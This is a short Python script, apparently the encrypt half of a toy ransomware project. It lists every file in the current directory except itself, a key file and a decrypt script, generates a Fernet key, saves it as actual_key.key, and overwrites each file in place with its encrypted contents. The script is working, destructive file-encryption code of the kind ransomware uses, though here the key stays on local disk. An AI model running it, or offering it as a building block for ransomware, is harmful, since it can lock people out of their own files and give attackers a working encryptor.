import os
from cryptography.fernet import Fernet
files= []
for file in os.listdir():
	if file == "encrypt.py" or file == "actual_key.key" or file == "decrypt.py":
		continue
	files.append(file)
print (files)
key = Fernet.generate_key()
with open("actual_key.key","wb") as actual_key:
	actual_key.write(key)
for file in files:
	with open(file,"rb") as file1:
		content= file1.read()
	encrypt_content= Fernet(key).encrypt(content)
	with open(file,"wb") as file1:
		file1.write(encrypt_content)
